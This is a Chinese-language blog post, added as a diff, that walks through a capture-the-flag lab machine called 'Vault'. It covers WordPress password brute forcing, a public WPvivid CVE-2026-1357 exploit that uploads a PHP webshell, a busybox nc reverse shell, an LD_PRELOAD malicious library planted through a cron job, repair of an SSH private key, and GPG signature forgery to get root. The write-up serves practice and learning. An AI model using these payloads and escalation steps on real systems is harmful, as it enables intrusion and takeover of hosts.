@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 信息收集
+
+老规矩，先用`arp-scan`在内网里找找谁是活的。">
+<meta property="og:title" content="内部_Vault">
+<meta property="og:description" content="# 信息收集
+
+老规矩，先用`arp-scan`在内网里找找谁是活的。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Vault.html">
+<meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
+<title>内部_Vault</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Vault</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/293" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>信息收集</h1>
+<p>老规矩，先用<code>arp-scan</code>在内网里找找谁是活的。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+[sudo] password for kali:        
+
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
+192.168.205.131 00:0c:29:c3:54:95       VMware, Inc.
+192.168.205.189 08:00:27:18:df:ea       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:e0:e2:35       VMware, Inc.
+
+5 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.013 seconds (127.17 hosts/sec). 5 responded
+</code></pre>
+<p>目标IP <code>192.168.205.189</code> 出现，接下来是端口扫描。为了不漏掉任何非标准端口，我直接扫全端口。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.189
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-28 00:43 -0400
+Nmap scan report for 192.168.205.189
+Host is up (0.00021s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:18:DF:EA (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds
+</code></pre>
+<p>开了22和80端口，标准的Web+SSH组合。先从80端口的Web服务下手。</p>
+<p>用<code>curl</code>看一下首页源码，信息量很大，各种<code>wp-</code>开头的路径，明显是个WordPress站。</p>
+<pre lang="html"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;zh-Hans&quot;&gt;
+&lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot; /&gt;
+...
+&lt;meta name=&quot;generator&quot; content=&quot;WordPress 6.9.4&quot; /&gt;
+...
+&lt;link rel=&quot;alternate&quot; type=&quot;application/rss+xml&quot; title=&quot;mazesec社区成员 &amp;raquo; Feed&quot; href=&quot;http://192.168.205.189/feed/&quot; /&gt;
+...
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>源码里直接标明了<code>WordPress 6.9.4</code>。用<code>whatweb</code>再确认一下。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ whatweb 192.168.205.189        
+ERROR Opening: https://192.168.205.189 - Connection refused - connect(2) for &quot;192.168.205.189&quot; port 443
+http://192.168.205.189 [200 OK] Apache[2.4.66], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.66 (Debian)], IP[192.168.205.189], MetaGenerator[WordPress 6.9.4], Script[application/json,importmap,module,speculationrules], Title[mazesec社区成员 &amp;#8211; 加入我们], UncommonHeaders[link], WordPress[6.9.4]
+</code></pre>
+<p><code>whatweb</code>的结果也证实了是WordPress 6.9.4，运行在Debian上的Apache 2.4.66。</p>
+<h1>初始突破</h1>
+<h2>WordPress信息搜集</h2>
+<p>既然是WordPress，<code>wpscan</code>是必不可少的工具。我先用它来枚举用户和有漏洞的插件。</p>
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ wpscan --url http://192.168.205.189 -e vp,u --api-token ***
+...
+[+] WordPress version 6.9.4 identified (Outdated，released on 2026-03-11).
+...
+[+] WordPress theme in use: twentytwentyfive
+ | [!] The version is out of date，the latest version is 1.5
+...
+[i] User(s) Identified:
+
+[+] kaada
+ | Found By: Rss Generator (Passive Detection)
+...
+</code></pre>
+<p><code>wpscan</code>扫出了一个用户名 <code>kaada</code>，并且提示WordPress版本和主题都有点旧。</p>
+<p>当时我还用更激进的模式扫了一下插件，发现了一个<code>WPvivid Backup &amp; Migration</code>插件的CVE (CVE-2026-1357)。但我尝试了公开的PoC，没能直接打成功，看到提示该漏洞需要在自动迁移生成密钥才能使用。</p>
+<p><img src="http://7r1UMPHK.github.io/image/20260529153505357.webp" alt="image-20260528130602573" /></p>
+<h2>密码猜解</h2>
+<p>既然有用户名<code>kaada</code>，下一步就是找密码。我试了rockyou字典的前几千行，没用。卡了一会，后面搞了好久，发现是从首页提取id生成字典。</p>
+<pre lang="bash"><code>curl -s http://192.168.205.189/ | grep -oP '(?&lt;=&lt;!--\s)[A-Za-z0-9_@.-]{6,}(?=\s--&gt;)' &gt; pass
+</code></pre>
+<p>这个命令把源码里所有被<code>&lt;!--</code>和<code>--&gt;</code>包裹的、长度大于等于6的字符串都提取出来，保存到<code>pass</code>文件里。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ wc -l pass                                                            
+19 pass
+</code></pre>
+<p>生成了一个19行的字典，都是页面里出现过的用户名。用这个小字典去爆破<code>kaada</code>的密码，成功率应该会高很多。</p>
+<pre lang="bash"><code>wpscan --url http://192.168.205.189 -U kaada -P pass --random-user-agent
+</code></pre>
+<pre><code>...
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - kaada / wea5e1                                                                                                                                                    
+...
+[!] Valid Combinations Found:
+ | Username: kaada，Password: wea5e1
+...
+</code></pre>
+<p>成功了！用户名<code>kaada</code>的密码是<code>wea5e1</code>。</p>
+<h2>Getshell</h2>
+<p>拿到后台账号密码，我立刻登录进去。果然看到了之前那个<code>WPvivid Backup &amp; Migration</code>插件。根据提示开启相对于的插件和生成密钥。</p>
+<p>接下来就是利用漏洞了。我下载了网上的PoC。</p>
+<pre lang="bash"><code>git clone https://github.com/halilkirazkaya/CVE-2026-1357.git
+cd CVE-2026-1357
+</code></pre>
+<p>在执行前，我留了个心眼，看了下<code>exploit.py</code>的源码。它默认的webshell是 <code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code>。考虑到<code>system</code>函数被<code>disable_functions</code>禁用了，我把它改成了<code>exec</code>。</p>
+<p><img src="http://7r1UMPHK.github.io/image/20260529153504672.webp" alt="image-20260528131421961" /></p>
+<pre lang="python"><code># exploit.py 源码片段
+...
+else:
+    # content = '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;'
+    content = '&lt;?php exec($_GET[&quot;cmd&quot;]); ?&gt;'
+...
+</code></pre>
+<p>改完后，我先试着执行<code>id</code>命令，但没有回显。</p>
+<pre lang="bash"><code>python3 exploit.py -u http://192.168.205.189 -s
+...
+[+] Verifying at: http://192.168.205.189/wp-content/uploads/lc2n7vpkmzwa2g0v66aqnvl4.php?cmd=id
+[!] Shell responded with status 200
+[!] Body: 
+</code></pre>
+<p>没回显是常事，直接上反弹shell。</p>
+<p>在我的Kali上监听8888端口:</p>
+<pre lang="bash"><code>nc -lvnp 8888
+</code></pre>
+<p>然后用PoC执行反弹shell命令:</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/CVE-2026-1357]
+└─$ python3 exploit.py -u http://192.168.205.189 -s &quot;busybox nc 192.168.205.128 8888 -e /bin/bash&quot;
+
+   ╔══════════════════════════════════════════════════════════╗
+   ║        CVE-2026-1357  WPvivid RCE PoC                    ║
+   ║        WPvivid Backup &amp; Migration &lt;= 0.9.123             ║
+   ╚══════════════════════════════════════════════════════════╝
+  
+[*] Target       : http://192.168.205.189/
+[*] Mode         : Shell
+[*] Upload path  : ../uploads/is9tgx7527a9o52u4bpjr0et.php
+[*] Verify cmd   : busybox nc 192.168.205.128 8888 -e /bin/bash
+
+[+] Generating encrypted payload (AES-128-CBC, null key + null IV)...
+[+] Payload size : 392 bytes (base64)
+[+] Sending exploit via wpvivid_action=send_to_site ...
+[+] Response     : 200
+[+] Body         : {&quot;result&quot;:&quot;success&quot;,&quot;op&quot;:&quot;finished&quot;}
+
+[+] Verifying at: http://192.168.205.189/wp-content/uploads/is9tgx7527a9o52u4bpjr0et.php?cmd=busybox nc 192.168.205.128 8888 -e /bin/bash
+</code></pre>
+<p>监听窗口收到了连接请求。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/CVE-2026-1357]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.189] 53566
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>成功拿到<code>www-data</code>的shell。</p>
+<h1>权限提升</h1>
+<h2>提权至 ta0</h2>
+<p>拿到的shell交互性很差，先用标准方法稳定一下。</p>
+<pre lang="bash"><code>script /dev/null -c bash
+# 按下 Ctrl+Z
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=/bin/bash
+stty rows 36 columns 178
+# 窗口大小每个人不一样，使用下面代码查询
+# stty -a|grep 'row'|awk -F'[ ;]+' '{print &quot;stty &quot;$4,$5,$6,$7}'
+</code></pre>
+<p>为了寻找提权机会，我上传并运行了<code>pspy64</code>来监控系统进程。很快发现了一个以UID 1000(ta0)运行的定时任务。</p>
+<pre><code>2026/05/28 02:28:01 CMD: UID=1000  PID=2864   | /bin/bash /var/tmp/.sys_update 
+2026/05/28 02:28:01 CMD: UID=1000  PID=2863   | /bin/sh -c /bin/bash /var/tmp/.sys_update 
+2026/05/28 02:28:01 CMD: UID=0     PID=2862   | /usr/sbin/CRON -f 
+</code></pre>
+<p>查看这个脚本<code>/var/tmp/.sys_update</code>的内容。</p>
+<pre lang="bash"><code>www-data@Vault:/tmp$ cat /var/tmp/.sys_update
+#!/bin/bash
+
+curr_sec=$(date +%-S)
+if [ $curr_sec -lt 30 ]; then
+    diff=$((30 - curr_sec))
+    read -t $diff &lt;&gt; &lt;(:) &gt; /dev/null 2&gt;&amp;1
+fi
+
+CONF=&quot;/var/tmp/.service_config&quot;
+
+if [ -f &quot;$CONF&quot; ]; then
+    CHECK=$(grep -vE &quot;^export [A-Z_]+=[/a-zA-Z0-9._-]+$&quot; &quot;$CONF&quot;)
+
+    if [ -z &quot;$CHECK&quot; ]; then
+        . &quot;$CONF&quot;
+    fi
+fi
+
+exec -a &quot;/usr/sbin/sys-stats-collect&quot; /usr/bin/awk 'BEGIN{print &quot;Job Done&quot;}' &gt; /dev/null 2&gt;&amp;1
+</code></pre>
+<p>这个脚本会检查<code>/var/tmp/.service_config</code>文件是否存在。如果存在，并且内容符合一个特定的正则表达式，就会用<code>.</code>命令(等同于<code>source</code>)来执行它。这意味着脚本会加载我们在这个文件中定义的环境变量。</p>
+<p>这里典型的提权思路是利用<code>LD_PRELOAD</code>。我创建一个恶意的<code>.so</code>文件，然后在<code>.service_config</code>中设置<code>LD_PRELOAD</code>指向它。当<code>ta0</code>用户执行<code>awk</code>时，就会加载我的<code>.so</code>文件，以<code>ta0</code>的权限执行我预设的代码。</p>
+<ol>
+<li>
+<p>编写恶意C代码，功能是复制<code>/bin/bash</code>并给它加上SUID权限位。</p>
+<pre lang="bash"><code>www-data@Vault:/tmp$ cat &gt; /var/tmp/.evil.c &lt;&lt; 'EOF'
+#include &lt;stdlib.h&gt;
+__attribute__((constructor)) void pwn() {
+    system(&quot;cp /bin/bash /var/tmp/.b &amp;&amp; chmod 4755 /var/tmp/.b&quot;);
+}
+EOF
+</code></pre>
+</li>
+<li>
+<p>编译成共享库<code>.so</code>文件。</p>
+<pre lang="bash"><code>www-data@Vault:/tmp$ gcc -shared -fPIC -o /var/tmp/.evil.so /var/tmp/.evil.c -nostartfiles
+</code></pre>
+</li>
+<li>
+<p>创建<code>.service_config</code>文件，设置<code>LD_PRELOAD</code>。</p>
+<pre lang="bash"><code>www-data@Vault:/tmp$ echo 'export LD_PRELOAD=/var/tmp/.evil.so' &gt; /var/tmp/.service_config
+</code></pre>
+<p>现在只需要等待cron任务执行。最多一分钟，cron就会运行脚本，加载我们的恶意so文件。</p>
+</li>
+</ol>
+<pre lang="bash"><code>www-data@Vault:/tmp$ ls -al /var/tmp/.b
+-rwsr-xr-x 1 ta0 ta0 1168776 May 28 02:32 /var/tmp/.b
+www-data@Vault:/tmp$ /var/tmp/.b -p
+.b-5.0$ id
+uid=33(www-data) gid=33(www-data) euid=1000(ta0) groups=33(www-data)
+</code></pre>
+<p>成功了，执行这个带SUID的bash后，我获得了<code>ta0</code>的有效用户ID。</p>
+<h2>横向至 Sublarge</h2>
+<p>以<code>ta0</code>的身份，我开始翻他的家目录。</p>
+<pre lang="bash"><code>.b-5.0$ cd /home/ta0/
+.b-5.0$ ls -al
+...
+-rw------- 1 ta0  ta0   842 Apr 16 02:24 broken.txt
+-rw------- 1 ta0  ta0  1842 Apr 11 11:17 key
+-rw-r--r-- 1 root root   44 Mar 26 09:37 user.txt
+</code></pre>
+<p>发现一个<code>broken.txt</code>和一个<code>key</code>文件。<code>broken.txt</code>里是一道RSA解密题。</p>
+<pre><code>在一场代号为“暗箭”的安全行动中，MazeSec社区的老大ll104567获取了一台名为Vault的服务器的一些信息。该服务器由一名叫Sublarge的高级管理员管理。
+你需要去获取加密的信息,才能得到Sublarge管理员的权限
+据信，12138对Sublarge里面的一些信息做了手脚，你能发现吗?
+ll104567获取到的信息如下:
+N=34290741416599402000364426406985307108788847346139849276056423456850484785031054576175547387593396760716456841067680666550537736929030835788005715533
+e=65537
+C=6306633972929323441109245980962040907076223927772663682932361844805694754336072683925275888222658229758199381118184386449967084124219498140114920047
+剩下的就需要靠你自己了，去计算出来p和q,就可以得到加密的信息了。
+哦对了，这个加密的信息可以多次利用！
+</code></pre>
+<p><code>key</code>文件则是一个损坏的SSH私钥。</p>
+<pre><code>-----BEGIN OPENSSH PRIVATE KEY-----
+b3ByohfdbnhchskcbhdAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+...
+sM***************************              #这里的信息被删除了
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p>很明显，<code>broken.txt</code>里的RSA密文解出来就是<code>key</code>文件中被删除的那部分。用Python脚本分解N，计算出d，然后解密C。</p>
+<pre lang="python"><code>from sympy import factorint
+
+N=34290741416599402000364426406985307108788847346139849276056423456850484785031054576175547387593396760716456841067680666550537736929030835788005715533
+e=65537
+C=6306633972929323441109245980962040907076223927772663682932361844805694754336072683925275888222658229758199381118184386449967084124219498140114920047
+
+f = factorint(N)
+p，q = list(f.keys())
+phi = (p-1)*(q-1)
+d = pow(e，-1，phi)
+m = pow(C，d，N)
+print(bytes.fromhex(hex(m)[2:]).decode())
+</code></pre>
+<p>执行脚本得到结果:</p>
+<pre><code>flag{sMZfeCxJpMbEX0fLAAAADlN1YmxhcmdlQFZhdWx0AQIDBA==}
+</code></pre>
+<p>这个<code>flag{...}</code>字符串应该就是私钥缺失的部分。</p>
+<p>再看损坏的<code>key</code>文件，它的头部<code>b3ByohfdbnhchskcbhdA</code>明显不对，正常的OpenSSH私钥头部应该是<code>b3BlbnNzaC1rZXktdjE</code>，我把它修正过来。尾部也从<code>-----END RSA PRIVATE KEY-----</code>修正为<code>-----END OPENSSH PRIVATE KEY-----</code>。然后用解密出的字符串替换掉<code>sM***</code>部分，得到一个完整的私钥，命名为<code>id</code>。</p>
+<pre><code>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA8Le3BIFbL/x2Sj6XezgLN74alDkgAAAKA0SMbuYhfOdahinbXffT
+5VvP/qBk9llf2jBMBGg0Jy2wMeAexvk8bRY18eEYVZTiES1alZgB//07hwSJWhfkd1l2Oh
+ZGMjfOAQTo1ViBSdL9NaPe3Xqdy1398fglh6fsLYtAAism6RJI1KbCyBtTrUOGx5m/Fep2
+DVs55XhuTEnq7cM/pnp8Wp1Kjuple/sUj0yTPm0L8zu6PLKLfrSFNKKGbDmiiS18wl6EgO
+0/7awt3gNLBipJCxPaJuda6Zrs49lx0Pytd0uwwl/OhsHzqg6b8fXzKOZpy77+86+uAqol
+A3puUCQV/QAAA8h6LZeOei2XjgAAAAdzc2gtcnNhAAABAQDwt7cEgVsv/HZKPpd7OAs3vh
+qUOSAAAAoDRIxu5iF851qGKdtd99PlW8/+oGT2WV/aMEwEaDQnLbAx4B7G+TxtFjXx4RhV
+lOIRLVqVmAH//TuHBIlaF+R3WXY6FkYyN84BBOjVWIFJ0v01o97dep3LXf3x+CWHp+wti0
+ACKybpEkjUpsLIG1OtQ4bHmb8V6nYNWznleG5MSertwz+menxanUqO6mV7+xSPTJM+bQvz
+O7o8sot+tIU0ooZsOaKJLXzCXoSA7T/trC3eA0sGKkkLE9om51rpmuzj2XHQ/K13S7DCX8
+6GwfOqDpvx9fMo5mnLvv7zr64CqiUDem5QJBX9AAAAAwEAAQAAAQAqsescOXVbBYRVltR3
+XnFe6bD9KUSru1YLTlU6NkcqSD6eHT5zZEmJHMe/eeNublu572cMQQ8/A7OEpSPQVtSI5K
++cvzf5tfaC5XBzqApyxQ+R2xQhjqtPH+cAVoMM1SkMtTo23QPRfEK9CNu2nNDwCTPJfyHo
+9bfGPDSWLeEw5V0/2caiBTAWTLFaOY8RiISDU6RcSI5c/rTCHoBesIfUAsM7Y8eOB5+AqG
+C9mUkDOTlAtoulEHGD7I799oQV/fdpeAuN/K/wvf33Xk8zdY9qRMNo+lyR0sDbRhalitmN
+h9UzlV1AnEkFbuMjA8jY6UB6X2CY5V0wWs2/yxI2m81hAAAAgQDF7aw9j6alW3el9m0D1D
+jqJhdis8rcGvHJn/twnA0Z2+zSvphlbn2Usks+HY7jEkTKmURccEAagWza2PphosJ8A/iB
+TqYGygLTxnFL4rrOtKEE2QSwZ5GWZ2EVva7sVu70mA1Ei0mlFygD5VHcpAVavFlWeKsF87
+0Jzht5plWIgwAAAIEA/jN85wH3aT1GW/4ndr8QVFQ9zeEPCPzWeUb9HlegPHvdfRcjiSN8
+UZPtjTO4Qo4NSBd9KatNAn+5h+6wmFrjRCwNAqLy+eEyqgzbR51MNU4n1nkvG1YIEr4rXt
+1llgpyGtny92AENbP3rYkSrAxt8XQQ+zjCKZTsmHhzeVkSEFcAAACBAPJrzN1zxtevT6Fi
+fS19n1QHKZXzkM2qx8yLvtoDmcww+LpN3bNBFJM6oAGBaWi+z7wZ795PhrocBaX9JlRuuq
++GplGimONDqrMX468nOJLy61xZuj2L1hi8shWDranUEKwIQi9KHvYgjX4i9xoUfvVbB838
+sMZfeCxJpMbEX0fLAAAADlN1YmxhcmdlQFZhdWx0AQIDBA==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<pre lang="bash"><code>.b-5.0$ chmod 600 id
+.b-5.0$ sed -i 's/-----END RSA PRIVATE KEY-----/-----END OPENSSH PRIVATE KEY-----/' id
+.b-5.0$ ssh -i id Sublarge@127.0.0.1
+...
+Sublarge@Vault:~$ id
+uid=1001(Sublarge) gid=1001(Sublarge) groups=1001(Sublarge)
+</code></pre>
+<p>成功登录，现在是<code>Sublarge</code>用户了。</p>
+<h2>提权至 root</h2>
+<p>作为<code>Sublarge</code>用户，检查<code>sudo</code>权限。</p>
+<pre lang="bash"><code>Sublarge@Vault:~$ sudo -l
+Matching Defaults entries for Sublarge on Vault:
+    env_reset，mail_badpass，secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User Sublarge may run the following commands on Vault:
+    (root) NOPASSWD: /usr/local/bin/secure_audit
+</code></pre>
+<p><code>Sublarge</code>可以免密以root身份执行<code>/usr/local/bin/secure_audit</code>。看看这个脚本干了什么。</p>
+<pre lang="bash"><code>Sublarge@Vault:~$ cat /usr/local/bin/secure_audit
+#!/bin/bash
+GPG_BIN=&quot;/usr/bin/gpg&quot;
+PUB_KEY=&quot;/home/Sublarge/audit_pub.asc&quot;
+REPORT=&quot;/var/tmp/report.gpg&quot;
+
+$GPG_BIN --import &quot;$PUB_KEY&quot;
+
+if $GPG_BIN --batch --trust-model always --verify &quot;$REPORT&quot;; then
+    echo &quot;[+] 签名验证通过，正在执行审计指令...&quot;
+    CMD=$($GPG_BIN --batch --decrypt &quot;$REPORT&quot; 2&gt;/dev/null)
+    eval &quot;$CMD&quot;
+else
+    echo &quot;[-] 签名校验失败！&quot;
+    exit 1
+fi
+</code></pre>
+<p>脚本会导入一个公钥，验证一个报告文件<code>/var/tmp/report.gpg</code>的签名，如果验证通过，就解密报告内容并通过<code>eval</code>执行。</p>
+<p>这是一个典型的GPG签名伪造提权。我们可以自己生成一对GPG密钥，然后用自己的私钥签名一个恶意命令，再让脚本以root身份执行。</p>
+<ol>
+<li>
+<p>生成自己的GPG密钥对。</p>
+<pre lang="bash"><code>Sublarge@Vault:~$ gpg --batch --gen-key &lt;&lt;EOF
+Key-Type: RSA
+Key-Length: 2048
+Name-Real: Audit
+Name-Email: audit@vault
+Expire-Date: 0
+%no-protection
+%commit
+EOF
+</code></pre>
+</li>
+<li>
+<p>导出公钥，覆盖脚本要用的公钥文件。</p>
+<pre lang="bash"><code>Sublarge@Vault:~$ gpg --export --armor audit@vault &gt; /home/Sublarge/audit_pub.asc
+</code></pre>
+</li>
+<li>
+<p>创建并签名恶意命令，内容是给<code>/bin/bash</code>加上SUID权限。</p>
+<pre lang="bash"><code>Sublarge@Vault:~$ echo 'chmod u+s /bin/bash' | gpg --batch --sign --armor --trust-model always -o /var/tmp/report.gpg
+</code></pre>
+</li>
+<li>
+<p>以root身份执行审计脚本。</p>
+<pre lang="bash"><code>Sublarge@Vault:~$ sudo /usr/local/bin/secure_audit
+gpg: directory '/root/.gnupg' created
+...
+gpg: Good signature from &quot;Audit &lt;audit@vault&gt;&quot; [unknown]
+[+] 签名验证通过，正在执行审计指令...
+</code></pre>
+<p>脚本成功验证了我们自己的签名，并执行了<code>chmod</code>命令。现在，<code>/bin/bash</code>应该已经有了SUID位。</p>
+</li>
+</ol>
+<pre lang="bash"><code>Sublarge@Vault:~$ /bin/bash -p
+bash-5.0# id
+uid=1001(Sublarge) gid=1001(Sublarge) euid=0(root) groups=1001(Sublarge)
+</code></pre>
+<p>执行<code>/bin/bash -p</code>，成功拿到root权限。打完收工。</p>
+</div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
